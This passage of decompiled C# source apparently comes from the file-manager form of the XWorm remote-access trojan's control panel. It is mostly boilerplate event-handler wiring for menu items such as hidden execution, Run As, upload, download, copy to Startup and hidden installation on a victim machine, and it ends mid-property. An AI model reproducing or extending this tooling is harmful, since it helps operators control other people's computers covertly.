using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using XWorm.My;
using XWorm.My.Resources;

namespace XWorm
{
	// Token: 0x02000011 RID: 17
	[DesignerGenerated]
	public partial class FM : Form
	{
		// Token: 0x06000106 RID: 262 RVA: 0x0000953C File Offset: 0x0000773C
		public FM()
		{
			base.Load += this.FM_Load;
			base.FormClosing += this.FM_FormClosing;
			base.Resize += this.FM_Resize;
			this.InitializeComponent();
		}

		// Token: 0x1700006F RID: 111
		// (get) Token: 0x06000109 RID: 265 RVA: 0x0000BA32 File Offset: 0x00009C32
		// (set) Token: 0x0600010A RID: 266 RVA: 0x0000BA3C File Offset: 0x00009C3C
		internal virtual ImageList ImageList1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000070 RID: 112
		// (get) Token: 0x0600010B RID: 267 RVA: 0x0000BA45 File Offset: 0x00009C45
		// (set) Token: 0x0600010C RID: 268 RVA: 0x0000BA4F File Offset: 0x00009C4F
		internal virtual ColumnHeader FileName { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000071 RID: 113
		// (get) Token: 0x0600010D RID: 269 RVA: 0x0000BA58 File Offset: 0x00009C58
		// (set) Token: 0x0600010E RID: 270 RVA: 0x0000BA64 File Offset: 0x00009C64
		internal virtual ListView ListView1
		{
			[CompilerGenerated]
			get
			{
				return this._ListView1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ListView1_DoubleClick);
				KeyEventHandler value3 = new KeyEventHandler(this.ListView1_KeyDown);
				EventHandler value4 = new EventHandler(this.ListView1_SelectedIndexChanged);
				DragEventHandler value5 = new DragEventHandler(this.ListView1_DragEnter);
				DragEventHandler value6 = new DragEventHandler(this.ListView1_DragDrop);
				ListView listView = this._ListView1;
				if (listView != null)
				{
					listView.DoubleClick -= value2;
					listView.KeyDown -= value3;
					listView.SelectedIndexChanged -= value4;
					listView.DragEnter -= value5;
					listView.DragDrop -= value6;
				}
				this._ListView1 = value;
				listView = this._ListView1;
				if (listView != null)
				{
					listView.DoubleClick += value2;
					listView.KeyDown += value3;
					listView.SelectedIndexChanged += value4;
					listView.DragEnter += value5;
					listView.DragDrop += value6;
				}
			}
		}

		// Token: 0x17000072 RID: 114
		// (get) Token: 0x0600010F RID: 271 RVA: 0x0000BB24 File Offset: 0x00009D24
		// (set) Token: 0x06000110 RID: 272 RVA: 0x0000BB2E File Offset: 0x00009D2E
		internal virtual PictureBox PictureBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000073 RID: 115
		// (get) Token: 0x06000111 RID: 273 RVA: 0x0000BB37 File Offset: 0x00009D37
		// (set) Token: 0x06000112 RID: 274 RVA: 0x0000BB44 File Offset: 0x00009D44
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x17000074 RID: 116
		// (get) Token: 0x06000113 RID: 275 RVA: 0x0000BB87 File Offset: 0x00009D87
		// (set) Token: 0x06000114 RID: 276 RVA: 0x0000BB91 File Offset: 0x00009D91
		internal virtual StatusStrip StatusStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000075 RID: 117
		// (get) Token: 0x06000115 RID: 277 RVA: 0x0000BB9A File Offset: 0x00009D9A
		// (set) Token: 0x06000116 RID: 278 RVA: 0x0000BBA4 File Offset: 0x00009DA4
		internal virtual ToolStripStatusLabel ToolStripStatusLabel1
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripStatusLabel1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripStatusLabel1_Click);
				ToolStripStatusLabel toolStripStatusLabel = this._ToolStripStatusLabel1;
				if (toolStripStatusLabel != null)
				{
					toolStripStatusLabel.Click -= value2;
				}
				this._ToolStripStatusLabel1 = value;
				toolStripStatusLabel = this._ToolStripStatusLabel1;
				if (toolStripStatusLabel != null)
				{
					toolStripStatusLabel.Click += value2;
				}
			}
		}

		// Token: 0x17000076 RID: 118
		// (get) Token: 0x06000117 RID: 279 RVA: 0x0000BBE7 File Offset: 0x00009DE7
		// (set) Token: 0x06000118 RID: 280 RVA: 0x0000BBF1 File Offset: 0x00009DF1
		internal virtual ToolStripStatusLabel ToolStripStatusLabel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000077 RID: 119
		// (get) Token: 0x06000119 RID: 281 RVA: 0x0000BBFA File Offset: 0x00009DFA
		// (set) Token: 0x0600011A RID: 282 RVA: 0x0000BC04 File Offset: 0x00009E04
		internal virtual Guna2TextBox Guna2TextBox1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2TextBox1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				KeyEventHandler value2 = new KeyEventHandler(this.Guna2TextBox1_KeyDown);
				Guna2TextBox guna2TextBox = this._Guna2TextBox1;
				if (guna2TextBox != null)
				{
					guna2TextBox.KeyDown -= value2;
				}
				this._Guna2TextBox1 = value;
				guna2TextBox = this._Guna2TextBox1;
				if (guna2TextBox != null)
				{
					guna2TextBox.KeyDown += value2;
				}
			}
		}

		// Token: 0x17000078 RID: 120
		// (get) Token: 0x0600011B RID: 283 RVA: 0x0000BC47 File Offset: 0x00009E47
		// (set) Token: 0x0600011C RID: 284 RVA: 0x0000BC51 File Offset: 0x00009E51
		internal virtual Guna2ContextMenuStrip Guna2ContextMenuStrip2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000079 RID: 121
		// (get) Token: 0x0600011D RID: 285 RVA: 0x0000BC5A File Offset: 0x00009E5A
		// (set) Token: 0x0600011E RID: 286 RVA: 0x0000BC64 File Offset: 0x00009E64
		internal virtual ToolStripMenuItem BackToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._BackToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.BackToolStripMenuItem1_Click);
				ToolStripMenuItem backToolStripMenuItem = this._BackToolStripMenuItem1;
				if (backToolStripMenuItem != null)
				{
					backToolStripMenuItem.Click -= value2;
				}
				this._BackToolStripMenuItem1 = value;
				backToolStripMenuItem = this._BackToolStripMenuItem1;
				if (backToolStripMenuItem != null)
				{
					backToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700007A RID: 122
		// (get) Token: 0x0600011F RID: 287 RVA: 0x0000BCA7 File Offset: 0x00009EA7
		// (set) Token: 0x06000120 RID: 288 RVA: 0x0000BCB4 File Offset: 0x00009EB4
		internal virtual ToolStripMenuItem RefreshToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._RefreshToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RefreshToolStripMenuItem_Click);
				ToolStripMenuItem refreshToolStripMenuItem = this._RefreshToolStripMenuItem;
				if (refreshToolStripMenuItem != null)
				{
					refreshToolStripMenuItem.Click -= value2;
				}
				this._RefreshToolStripMenuItem = value;
				refreshToolStripMenuItem = this._RefreshToolStripMenuItem;
				if (refreshToolStripMenuItem != null)
				{
					refreshToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700007B RID: 123
		// (get) Token: 0x06000121 RID: 289 RVA: 0x0000BCF7 File Offset: 0x00009EF7
		// (set) Token: 0x06000122 RID: 290 RVA: 0x0000BD01 File Offset: 0x00009F01
		internal virtual ToolStripMenuItem GoToToolStripMenuItem1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700007C RID: 124
		// (get) Token: 0x06000123 RID: 291 RVA: 0x0000BD0A File Offset: 0x00009F0A
		// (set) Token: 0x06000124 RID: 292 RVA: 0x0000BD14 File Offset: 0x00009F14
		internal virtual ToolStripMenuItem DesktopToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._DesktopToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DesktopToolStripMenuItem_Click);
				ToolStripMenuItem desktopToolStripMenuItem = this._DesktopToolStripMenuItem;
				if (desktopToolStripMenuItem != null)
				{
					desktopToolStripMenuItem.Click -= value2;
				}
				this._DesktopToolStripMenuItem = value;
				desktopToolStripMenuItem = this._DesktopToolStripMenuItem;
				if (desktopToolStripMenuItem != null)
				{
					desktopToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700007D RID: 125
		// (get) Token: 0x06000125 RID: 293 RVA: 0x0000BD57 File Offset: 0x00009F57
		// (set) Token: 0x06000126 RID: 294 RVA: 0x0000BD64 File Offset: 0x00009F64
		internal virtual ToolStripMenuItem UserFolderToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._UserFolderToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UserFolderToolStripMenuItem_Click);
				ToolStripMenuItem userFolderToolStripMenuItem = this._UserFolderToolStripMenuItem;
				if (userFolderToolStripMenuItem != null)
				{
					userFolderToolStripMenuItem.Click -= value2;
				}
				this._UserFolderToolStripMenuItem = value;
				userFolderToolStripMenuItem = this._UserFolderToolStripMenuItem;
				if (userFolderToolStripMenuItem != null)
				{
					userFolderToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700007E RID: 126
		// (get) Token: 0x06000127 RID: 295 RVA: 0x0000BDA7 File Offset: 0x00009FA7
		// (set) Token: 0x06000128 RID: 296 RVA: 0x0000BDB4 File Offset: 0x00009FB4
		internal virtual ToolStripMenuItem TempToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._TempToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.TempToolStripMenuItem1_Click);
				ToolStripMenuItem tempToolStripMenuItem = this._TempToolStripMenuItem1;
				if (tempToolStripMenuItem != null)
				{
					tempToolStripMenuItem.Click -= value2;
				}
				this._TempToolStripMenuItem1 = value;
				tempToolStripMenuItem = this._TempToolStripMenuItem1;
				if (tempToolStripMenuItem != null)
				{
					tempToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700007F RID: 127
		// (get) Token: 0x06000129 RID: 297 RVA: 0x0000BDF7 File Offset: 0x00009FF7
		// (set) Token: 0x0600012A RID: 298 RVA: 0x0000BE04 File Offset: 0x0000A004
		internal virtual ToolStripMenuItem AppDataToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._AppDataToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.AppDataToolStripMenuItem_Click);
				ToolStripMenuItem appDataToolStripMenuItem = this._AppDataToolStripMenuItem;
				if (appDataToolStripMenuItem != null)
				{
					appDataToolStripMenuItem.Click -= value2;
				}
				this._AppDataToolStripMenuItem = value;
				appDataToolStripMenuItem = this._AppDataToolStripMenuItem;
				if (appDataToolStripMenuItem != null)
				{
					appDataToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000080 RID: 128
		// (get) Token: 0x0600012B RID: 299 RVA: 0x0000BE47 File Offset: 0x0000A047
		// (set) Token: 0x0600012C RID: 300 RVA: 0x0000BE54 File Offset: 0x0000A054
		internal virtual ToolStripMenuItem StartupToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._StartupToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.StartupToolStripMenuItem1_Click);
				ToolStripMenuItem startupToolStripMenuItem = this._StartupToolStripMenuItem1;
				if (startupToolStripMenuItem != null)
				{
					startupToolStripMenuItem.Click -= value2;
				}
				this._StartupToolStripMenuItem1 = value;
				startupToolStripMenuItem = this._StartupToolStripMenuItem1;
				if (startupToolStripMenuItem != null)
				{
					startupToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000081 RID: 129
		// (get) Token: 0x0600012D RID: 301 RVA: 0x0000BE97 File Offset: 0x0000A097
		// (set) Token: 0x0600012E RID: 302 RVA: 0x0000BEA4 File Offset: 0x0000A0A4
		internal virtual ToolStripMenuItem CopyToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._CopyToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CopyToolStripMenuItem1_Click);
				ToolStripMenuItem copyToolStripMenuItem = this._CopyToolStripMenuItem1;
				if (copyToolStripMenuItem != null)
				{
					copyToolStripMenuItem.Click -= value2;
				}
				this._CopyToolStripMenuItem1 = value;
				copyToolStripMenuItem = this._CopyToolStripMenuItem1;
				if (copyToolStripMenuItem != null)
				{
					copyToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000082 RID: 130
		// (get) Token: 0x0600012F RID: 303 RVA: 0x0000BEE7 File Offset: 0x0000A0E7
		// (set) Token: 0x06000130 RID: 304 RVA: 0x0000BEF4 File Offset: 0x0000A0F4
		internal virtual ToolStripMenuItem CutToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._CutToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CutToolStripMenuItem1_Click);
				ToolStripMenuItem cutToolStripMenuItem = this._CutToolStripMenuItem1;
				if (cutToolStripMenuItem != null)
				{
					cutToolStripMenuItem.Click -= value2;
				}
				this._CutToolStripMenuItem1 = value;
				cutToolStripMenuItem = this._CutToolStripMenuItem1;
				if (cutToolStripMenuItem != null)
				{
					cutToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000083 RID: 131
		// (get) Token: 0x06000131 RID: 305 RVA: 0x0000BF37 File Offset: 0x0000A137
		// (set) Token: 0x06000132 RID: 306 RVA: 0x0000BF44 File Offset: 0x0000A144
		internal virtual ToolStripMenuItem PasteToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._PasteToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.PasteToolStripMenuItem_Click);
				ToolStripMenuItem pasteToolStripMenuItem = this._PasteToolStripMenuItem;
				if (pasteToolStripMenuItem != null)
				{
					pasteToolStripMenuItem.Click -= value2;
				}
				this._PasteToolStripMenuItem = value;
				pasteToolStripMenuItem = this._PasteToolStripMenuItem;
				if (pasteToolStripMenuItem != null)
				{
					pasteToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000084 RID: 132
		// (get) Token: 0x06000133 RID: 307 RVA: 0x0000BF87 File Offset: 0x0000A187
		// (set) Token: 0x06000134 RID: 308 RVA: 0x0000BF94 File Offset: 0x0000A194
		internal virtual ToolStripMenuItem EditToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._EditToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.EditToolStripMenuItem1_Click);
				ToolStripMenuItem editToolStripMenuItem = this._EditToolStripMenuItem1;
				if (editToolStripMenuItem != null)
				{
					editToolStripMenuItem.Click -= value2;
				}
				this._EditToolStripMenuItem1 = value;
				editToolStripMenuItem = this._EditToolStripMenuItem1;
				if (editToolStripMenuItem != null)
				{
					editToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000085 RID: 133
		// (get) Token: 0x06000135 RID: 309 RVA: 0x0000BFD7 File Offset: 0x0000A1D7
		// (set) Token: 0x06000136 RID: 310 RVA: 0x0000BFE1 File Offset: 0x0000A1E1
		internal virtual ToolStripMenuItem ExecuteToolStripMenuItem1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000086 RID: 134
		// (get) Token: 0x06000137 RID: 311 RVA: 0x0000BFEA File Offset: 0x0000A1EA
		// (set) Token: 0x06000138 RID: 312 RVA: 0x0000BFF4 File Offset: 0x0000A1F4
		internal virtual ToolStripMenuItem NormalToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._NormalToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.NormalToolStripMenuItem1_Click);
				ToolStripMenuItem normalToolStripMenuItem = this._NormalToolStripMenuItem1;
				if (normalToolStripMenuItem != null)
				{
					normalToolStripMenuItem.Click -= value2;
				}
				this._NormalToolStripMenuItem1 = value;
				normalToolStripMenuItem = this._NormalToolStripMenuItem1;
				if (normalToolStripMenuItem != null)
				{
					normalToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000087 RID: 135
		// (get) Token: 0x06000139 RID: 313 RVA: 0x0000C037 File Offset: 0x0000A237
		// (set) Token: 0x0600013A RID: 314 RVA: 0x0000C044 File Offset: 0x0000A244
		internal virtual ToolStripMenuItem HiddenToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._HiddenToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.HiddenToolStripMenuItem1_Click);
				ToolStripMenuItem hiddenToolStripMenuItem = this._HiddenToolStripMenuItem1;
				if (hiddenToolStripMenuItem != null)
				{
					hiddenToolStripMenuItem.Click -= value2;
				}
				this._HiddenToolStripMenuItem1 = value;
				hiddenToolStripMenuItem = this._HiddenToolStripMenuItem1;
				if (hiddenToolStripMenuItem != null)
				{
					hiddenToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000088 RID: 136
		// (get) Token: 0x0600013B RID: 315 RVA: 0x0000C087 File Offset: 0x0000A287
		// (set) Token: 0x0600013C RID: 316 RVA: 0x0000C094 File Offset: 0x0000A294
		internal virtual ToolStripMenuItem RunAsToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._RunAsToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RunAsToolStripMenuItem1_Click);
				ToolStripMenuItem runAsToolStripMenuItem = this._RunAsToolStripMenuItem1;
				if (runAsToolStripMenuItem != null)
				{
					runAsToolStripMenuItem.Click -= value2;
				}
				this._RunAsToolStripMenuItem1 = value;
				runAsToolStripMenuItem = this._RunAsToolStripMenuItem1;
				if (runAsToolStripMenuItem != null)
				{
					runAsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000089 RID: 137
		// (get) Token: 0x0600013D RID: 317 RVA: 0x0000C0D7 File Offset: 0x0000A2D7
		// (set) Token: 0x0600013E RID: 318 RVA: 0x0000C0E4 File Offset: 0x0000A2E4
		internal virtual ToolStripMenuItem RenameToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._RenameToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RenameToolStripMenuItem1_Click);
				ToolStripMenuItem renameToolStripMenuItem = this._RenameToolStripMenuItem1;
				if (renameToolStripMenuItem != null)
				{
					renameToolStripMenuItem.Click -= value2;
				}
				this._RenameToolStripMenuItem1 = value;
				renameToolStripMenuItem = this._RenameToolStripMenuItem1;
				if (renameToolStripMenuItem != null)
				{
					renameToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700008A RID: 138
		// (get) Token: 0x0600013F RID: 319 RVA: 0x0000C127 File Offset: 0x0000A327
		// (set) Token: 0x06000140 RID: 320 RVA: 0x0000C134 File Offset: 0x0000A334
		internal virtual ToolStripMenuItem DeleteToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._DeleteToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DeleteToolStripMenuItem1_Click);
				ToolStripMenuItem deleteToolStripMenuItem = this._DeleteToolStripMenuItem1;
				if (deleteToolStripMenuItem != null)
				{
					deleteToolStripMenuItem.Click -= value2;
				}
				this._DeleteToolStripMenuItem1 = value;
				deleteToolStripMenuItem = this._DeleteToolStripMenuItem1;
				if (deleteToolStripMenuItem != null)
				{
					deleteToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700008B RID: 139
		// (get) Token: 0x06000141 RID: 321 RVA: 0x0000C177 File Offset: 0x0000A377
		// (set) Token: 0x06000142 RID: 322 RVA: 0x0000C184 File Offset: 0x0000A384
		internal virtual ToolStripMenuItem UploadToolStripMenuItem2
		{
			[CompilerGenerated]
			get
			{
				return this._UploadToolStripMenuItem2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UploadToolStripMenuItem2_Click);
				ToolStripMenuItem uploadToolStripMenuItem = this._UploadToolStripMenuItem2;
				if (uploadToolStripMenuItem != null)
				{
					uploadToolStripMenuItem.Click -= value2;
				}
				this._UploadToolStripMenuItem2 = value;
				uploadToolStripMenuItem = this._UploadToolStripMenuItem2;
				if (uploadToolStripMenuItem != null)
				{
					uploadToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700008C RID: 140
		// (get) Token: 0x06000143 RID: 323 RVA: 0x0000C1C7 File Offset: 0x0000A3C7
		// (set) Token: 0x06000144 RID: 324 RVA: 0x0000C1D4 File Offset: 0x0000A3D4
		internal virtual ToolStripMenuItem DownloadToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._DownloadToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DownloadToolStripMenuItem1_Click);
				ToolStripMenuItem downloadToolStripMenuItem = this._DownloadToolStripMenuItem1;
				if (downloadToolStripMenuItem != null)
				{
					downloadToolStripMenuItem.Click -= value2;
				}
				this._DownloadToolStripMenuItem1 = value;
				downloadToolStripMenuItem = this._DownloadToolStripMenuItem1;
				if (downloadToolStripMenuItem != null)
				{
					downloadToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700008D RID: 141
		// (get) Token: 0x06000145 RID: 325 RVA: 0x0000C217 File Offset: 0x0000A417
		// (set) Token: 0x06000146 RID: 326 RVA: 0x0000C224 File Offset: 0x0000A424
		internal virtual ToolStripMenuItem NewFolderToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._NewFolderToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.NewFolderToolStripMenuItem1_Click);
				ToolStripMenuItem newFolderToolStripMenuItem = this._NewFolderToolStripMenuItem1;
				if (newFolderToolStripMenuItem != null)
				{
					newFolderToolStripMenuItem.Click -= value2;
				}
				this._NewFolderToolStripMenuItem1 = value;
				newFolderToolStripMenuItem = this._NewFolderToolStripMenuItem1;
				if (newFolderToolStripMenuItem != null)
				{
					newFolderToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700008E RID: 142
		// (get) Token: 0x06000147 RID: 327 RVA: 0x0000C267 File Offset: 0x0000A467
		// (set) Token: 0x06000148 RID: 328 RVA: 0x0000C274 File Offset: 0x0000A474
		internal virtual ToolStripMenuItem NewFileToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._NewFileToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.NewFileToolStripMenuItem_Click);
				ToolStripMenuItem newFileToolStripMenuItem = this._NewFileToolStripMenuItem;
				if (newFileToolStripMenuItem != null)
				{
					newFileToolStripMenuItem.Click -= value2;
				}
				this._NewFileToolStripMenuItem = value;
				newFileToolStripMenuItem = this._NewFileToolStripMenuItem;
				if (newFileToolStripMenuItem != null)
				{
					newFileToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700008F RID: 143
		// (get) Token: 0x06000149 RID: 329 RVA: 0x0000C2B7 File Offset: 0x0000A4B7
		// (set) Token: 0x0600014A RID: 330 RVA: 0x0000C2C1 File Offset: 0x0000A4C1
		internal virtual ToolStripMenuItem ShowHideToolStripMenuItem1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000090 RID: 144
		// (get) Token: 0x0600014B RID: 331 RVA: 0x0000C2CA File Offset: 0x0000A4CA
		// (set) Token: 0x0600014C RID: 332 RVA: 0x0000C2D4 File Offset: 0x0000A4D4
		internal virtual ToolStripMenuItem ShowFolderFileToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._ShowFolderFileToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ShowFolderFileToolStripMenuItem_Click);
				ToolStripMenuItem showFolderFileToolStripMenuItem = this._ShowFolderFileToolStripMenuItem;
				if (showFolderFileToolStripMenuItem != null)
				{
					showFolderFileToolStripMenuItem.Click -= value2;
				}
				this._ShowFolderFileToolStripMenuItem = value;
				showFolderFileToolStripMenuItem = this._ShowFolderFileToolStripMenuItem;
				if (showFolderFileToolStripMenuItem != null)
				{
					showFolderFileToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000091 RID: 145
		// (get) Token: 0x0600014D RID: 333 RVA: 0x0000C317 File Offset: 0x0000A517
		// (set) Token: 0x0600014E RID: 334 RVA: 0x0000C324 File Offset: 0x0000A524
		internal virtual ToolStripMenuItem HideFolderFileToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._HideFolderFileToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.HideFolderFileToolStripMenuItem_Click);
				ToolStripMenuItem hideFolderFileToolStripMenuItem = this._HideFolderFileToolStripMenuItem;
				if (hideFolderFileToolStripMenuItem != null)
				{
					hideFolderFileToolStripMenuItem.Click -= value2;
				}
				this._HideFolderFileToolStripMenuItem = value;
				hideFolderFileToolStripMenuItem = this._HideFolderFileToolStripMenuItem;
				if (hideFolderFileToolStripMenuItem != null)
				{
					hideFolderFileToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000092 RID: 146
		// (get) Token: 0x0600014F RID: 335 RVA: 0x0000C367 File Offset: 0x0000A567
		// (set) Token: 0x06000150 RID: 336 RVA: 0x0000C371 File Offset: 0x0000A571
		internal virtual ToolStripMenuItem ZipToolStripMenuItem1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000093 RID: 147
		// (get) Token: 0x06000151 RID: 337 RVA: 0x0000C37A File Offset: 0x0000A57A
		// (set) Token: 0x06000152 RID: 338 RVA: 0x0000C384 File Offset: 0x0000A584
		internal virtual ToolStripMenuItem HiddenInstallationlToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._HiddenInstallationlToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.HiddenInstallationlToolStripMenuItem_Click);
				ToolStripMenuItem hiddenInstallationlToolStripMenuItem = this._HiddenInstallationlToolStripMenuItem;
				if (hiddenInstallationlToolStripMenuItem != null)
				{
					hiddenInstallationlToolStripMenuItem.Click -= value2;
				}
				this._HiddenInstallationlToolStripMenuItem = value;
				hiddenInstallationlToolStripMenuItem = this._HiddenInstallationlToolStripMenuItem;
				if (hiddenInstallationlToolStripMenuItem != null)
				{
					hiddenInstallationlToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000094 RID: 148
		// (get) Token: 0x06000153 RID: 339 RVA: 0x0000C3C7 File Offset: 0x0000A5C7
		// (set) Token: 0x06000154 RID: 340 RVA: 0x0000C3D4 File Offset: 0x0000A5D4
		internal virtual ToolStripMenuItem ZipToolStripMenuItem2
		{
			[CompilerGenerated]
			get
			{
				return this._ZipToolStripMenuItem2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ZipToolStripMenuItem2_Click);
				ToolStripMenuItem zipToolStripMenuItem = this._ZipToolStripMenuItem2;
				if (zipToolStripMenuItem != null)
				{
					zipToolStripMenuItem.Click -= value2;
				}
				this._ZipToolStripMenuItem2 = value;
				zipToolStripMenuItem = this._ZipToolStripMenuItem2;
				if (zipToolStripMenuItem != null)
				{
					zipToolStripMenuItem.Click += value2;
